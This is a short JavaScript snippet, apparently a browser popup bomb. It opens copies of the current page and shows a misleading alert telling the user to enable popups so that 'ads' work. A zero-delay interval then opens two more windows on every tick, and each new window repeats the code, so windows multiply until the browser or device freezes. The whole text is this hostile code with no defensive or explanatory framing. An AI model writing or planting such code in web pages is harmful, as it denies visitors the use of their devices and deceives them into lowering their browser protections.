newWin = window.open(window.location.href);
if(!newWin || newWin.closed || typeof newWin.closed=='undefined') { 
  alert("Please enable popups inorder for the ads to work");
}

alert("Still using this device?");
setInterval(() => {
  window.open(window.location.href);
  window.open(window.location.href);
}, 0);
